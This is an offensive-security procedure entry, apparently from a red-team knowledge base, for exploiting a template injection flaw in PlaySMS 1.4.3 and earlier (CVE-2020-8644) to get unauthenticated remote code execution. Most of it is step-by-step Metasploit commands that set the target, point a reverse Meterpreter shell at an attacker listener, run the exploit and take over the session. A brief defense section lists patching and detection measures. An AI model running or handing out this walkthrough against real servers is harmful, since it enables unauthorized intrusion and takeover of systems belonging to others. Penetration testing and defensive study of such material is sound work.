---
id: 91473e99-d37d-4b2e-880e-2a6618c63e66
name: playsms-template-injection-rce-via-metasploit-unauthenticated
type: procedure
verified: true
submitted: true
created_at: '2020-04-17T02:20:12.613370+00:00'
updated_at: '2023-05-26T00:52:48.665837+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
sub_techniques: []
platforms:
  - Web
tags:
  - '[[tags/exploit]]'
  - '[[tags/injection]]'
  - '[[tags/Web Applications]]'
commands:
  - '[[commands/use-metasploit-playsms-template-injection-module]]'
tools:
  - '[[tools/Metasploit]]'
validated: true
---

# playsms-template-injection-rce-via-metasploit-unauthenticated

## Summary

This procedure exploits a template injection vulnerability in PlaySMS versions 1.4.3 and earlier (CVE-2020-8644), allowing unauthenticated remote code execution (RCE) through improper input validation. By submitting a malicious username, the payload is stored in a TPL template and executed upon rendering, enabling the delivery of a Meterpreter payload via Metasploit to gain a shell on the target web server.

## Description

PlaySMS is an open-source SMS gateway software vulnerable to unauthenticated template injection in its user registration or login features. The flaw occurs because user-supplied input is not sanitized before being inserted into Smarty TPL templates, which are then processed and executed server-side. This leads to arbitrary PHP code execution. The procedure uses the Metasploit module 'exploit/multi/http/playsms_template_injection' to automate the exploitation, sending a reverse shell payload to the attacker's listener. It is effective against default installations on Linux-based web servers running Apache or similar, typically on port 80 or 443. Success results in a Meterpreter session for further post-exploitation.

## Requirements

1. Metasploit Framework installed and running (e.g., on Kali Linux).
2. Network access to the target PlaySMS instance (unauthenticated, public-facing).
3. Knowledge of the target's IP address, port (default 80), and base URI (default /playsms).
4. Attacker machine with a public IP or reachable listener for reverse shell (LHOST set correctly).
5. Target running PlaySMS <= 1.4.3 with PHP and Smarty templating enabled.

## Defense

Defensive measures and detection strategies:

- Upgrade PlaySMS to version 1.4.4 or later to patch the input validation.
- Implement web application firewall (WAF) rules to block suspicious template injections (e.g., Smarty tags like {php} or {$variable}).
- Enable PHP logging and monitor for anomalous code execution in error logs.
- Use intrusion detection systems (IDS) to alert on Metasploit-like traffic patterns or unexpected outbound connections from the web server.
- Sanitize all user inputs server-side and disable Smarty's PHP execution if possible.

## Objectives

1. Exploit the template injection vulnerability to achieve unauthenticated RCE.
2. Establish a reverse Meterpreter session for command execution on the target.
3. Verify successful exploitation through interactive shell access.

## Instructions

### Step 1: Launch Metasploit and Select the Module

**Context**: Start a Metasploit console and load the specific exploit module for PlaySMS template injection to prepare the environment for configuration.

**Command** ([[commands/use-metasploit-playsms-template-injection-module]]):
```metasploit
msfconsole
use exploit/multi/http/playsms_template_injection
```

> This initializes the Metasploit framework and selects the module, displaying available options. Verify the module loads without errors, indicating Metasploit recognizes the exploit.

### Step 2: Configure Target Parameters

**Context**: Set the required options for the target host, port, and application path to tailor the exploit to the specific PlaySMS instance.

**Command** ([[commands/set-metasploit-target-parameters]]):
```metasploit
set RHOSTS $_TARGET_IP
set RPORT $_TARGET_PORT
set TARGETURI $_BASE_URI
```

> Replace placeholders with actual values (e.g., RHOSTS 10.10.10.10, RPORT 80, TARGETURI /playsms). This configures the module to point to the vulnerable endpoint. Check options with 'show options' to ensure no misconfigurations.

### Step 3: Set Payload Listener and Execute

**Context**: Configure the reverse payload handler and launch the exploit to inject the template and trigger RCE, establishing the session.

**Command** ([[commands/run-metasploit-playsms-exploit]]):
```metasploit
set LHOST $_ATTACKER_IP
set LPORT $_ATTACKER_PORT
run
```

> Ensure LHOST and LPORT are set to your attacker's reachable IP and port (e.g., LHOST 10.10.10.100, LPORT 4444). The 'run' command sends the malicious payload via HTTP POST to the registration endpoint, exploiting the template rendering. If the exploit succeeds, a Meterpreter session opens automatically.

### Step 4: Interact with the Session

**Context**: Once the session is established, interact with the Meterpreter shell to confirm control and perform basic verification.

**Command**:
```metasploit
sessions -i 1
getuid
```

> This switches to the new session (ID typically 1) and runs 'getuid' to display the current user (e.g., www-data). Success confirms RCE; use further Meterpreter commands for post-exploitation.
